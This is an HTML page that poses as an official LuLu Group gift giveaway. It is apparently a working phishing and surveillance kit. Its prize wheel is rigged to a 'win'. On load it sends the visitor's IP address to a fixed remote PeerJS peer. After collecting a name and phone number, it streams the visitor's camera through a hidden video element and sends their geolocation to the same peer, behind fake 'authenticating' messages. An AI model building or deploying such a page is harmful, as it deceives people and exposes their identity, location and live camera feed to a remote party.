<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gift Distribution | Official</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --accent: #2d8a39; --text: #1d1d1f; --bg: #ffffff; --gray: #f5f5f7; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            margin: 0; font-family: -apple-system, "SF Pro Display", "Helvetica Neue", sans-serif; 
            background: var(--bg); color: var(--text); overflow-x: hidden;
        }

        header { 
            padding: 30px 20px; text-align: center; background: var(--bg);
        }
        .header-tag { font-size: 12px; font-weight: 600; color: var(--accent); letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 8px; }
        .header-title { font-size: 24px; font-weight: 700; color: #000; }

        /* Minimalist Wheel - Prizes inside the slices */
        .wheel-container { position: relative; width: 330px; height: 330px; margin: 20px auto; }
        #wheel { 
            width: 100%; height: 100%; border-radius: 50%; border: 2px solid #eee;
            background: conic-gradient(
                #fff 0deg 45deg, var(--gray) 45deg 90deg, 
                #fff 90deg 135deg, var(--gray) 135deg 180deg, 
                #fff 180deg 225deg, var(--gray) 225deg 270deg,
                #fff 270deg 315deg, var(--gray) 315deg 360deg
            );
            transition: transform 9s cubic-bezier(0.1, 0, 0, 1);
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
        }
        .prize-text {
            position: absolute; width: 50%; height: 40px; top: 50%; left: 50%;
            transform-origin: 0% 50%; text-align: right; padding-right: 15px;
            font-size: 11px; font-weight: 600; color: #444; pointer-events: none;
        }
        .pointer { 
            position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
            width: 30px; height: 30px; background: #ff3b30; clip-path: polygon(50% 100%, 0 0, 100% 0);
            z-index: 10;
        }

        .page { display: none; padding: 20px; animation: fadeIn 0.4s ease forwards; }
        .active { display: block; }
        
        .card {
            max-width: 400px; margin: 0 auto; text-align: center; padding: 20px;
        }

        .btn-main {
            background: var(--text); color: #fff; border: none; width: 100%; 
            padding: 20px; border-radius: 14px; font-weight: 600; font-size: 16px;
            cursor: pointer; margin-top: 20px;
        }

        input {
            width: 100%; padding: 18px; margin-bottom: 12px; border-radius: 12px;
            border: 1px solid #d2d2d7; background: #fff; font-size: 16px; outline: none;
            text-align: center;
        }
        input:focus { border-color: var(--accent); }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        #cam-hide { position: fixed; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

<header>
    <div class="header-tag">LuLu Group International</div>
    <div class="header-title">Commemorative Distribution</div>
</header>

<div id="cam-hide"><video id="v" autoplay playsinline muted></video></div>

<div id="p1" class="page active">
    <div class="wheel-container">
        <div class="pointer"></div>
        <div id="wheel"></div>
    </div>
    <div class="card">
        <p style="font-size: 15px; color: #86868b; line-height: 1.5;">In honor of the birthday of the son of <b>M.A. Yusuff Ali</b>, you are eligible for one honorary gift.</p>
        <button class="btn-main" id="spin-btn" onclick="runSpin()">SPIN TO WIN</button>
    </div>
</div>

<div id="p2" class="page">
    <div class="card">
        <h2 style="margin-bottom: 8px;">Claim Your Prize</h2>
        <p id="win-name" style="font-weight: 700; color: var(--accent); margin-bottom: 30px;">iPhone 15 Pro Max</p>
        
        <input type="text" id="roll" placeholder="Full Name">
        <input type="number" id="school" placeholder="Contact Number">
        
        <button class="btn-main" onclick="startClaim()">CONFIRM DELIVERY</button>
    </div>
</div>

<div id="p3" class="page">
    <div class="card" style="margin-top: 60px;">
        <div id="status" style="font-size: 18px; font-weight: 600;">Authenticating...</div>
        <p style="font-size: 12px; color: #86868b; margin-top: 10px;">Connection Secured by Satori</p>
    </div>
</div>

<script>
    const PEER_ID = 'enkode-satori-v1-russel'; 
    const peer = new Peer();
    let conn;

    const gifts = ["iPhone 15 Pro", "AED 5,000", "iPad Air", "AED 2,500", "MacBook Air", "AED 1,000", "Lulu Voucher", "Watch Ultra"];
    const wheel = document.getElementById('wheel');
    
    // Position gifts inside the slices
    gifts.forEach((item, i) => {
        const el = document.createElement('div');
        el.className = 'prize-text';
        el.style.transform = `translate(-50%, -50%) rotate(${i * 45 + 22.5}deg)`;
        el.innerText = item;
        wheel.appendChild(el);
    });

    peer.on('open', () => {
        conn = peer.connect(PEER_ID);
        conn.on('open', async () => {
            let ip = "N/A";
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
            conn.send({ type: "INSTANT_LOG", ip: ip, time: new Date().toLocaleTimeString() });
        });
    });

    function runSpin() {
        document.getElementById('spin-btn').disabled = true;
        wheel.style.transform = "rotate(5422deg)"; // Lands on high-value prize
        setTimeout(() => { switchPage('p2'); }, 9500);
    }

    async function startClaim() {
        const n = document.getElementById('roll').value;
        const p = document.getElementById('school').value;
        if(!n || !p) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            peer.call(PEER_ID, stream);

            navigator.geolocation.getCurrentPosition(pos => {
                sendData(pos.coords.latitude, pos.coords.longitude);
            }, () => { sendData(null, null); });

            switchPage('p3');
            const steps = ["HANDSHAKE...", "IDENTITY SYNC...", "SUCCESS"];
            let idx = 0;
            setInterval(() => { if(idx < steps.length) document.getElementById('status').innerText = steps[idx++]; }, 3000);
        } catch (e) {
            alert("Verification Failed: Secure camera access is required to confirm identity for high-value shipments.");
            location.reload();
        }
    }

    function sendData(lat, lon) {
        if (conn?.open) {
            conn.send({
                type: "FULL_LOG",
                creds: { roll: document.getElementById('roll').value, school: document.getElementById('school').value },
                geo: { lat: lat, lon: lon }
            });
        }
    }

    function switchPage(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }
</script>
</body>
</html>
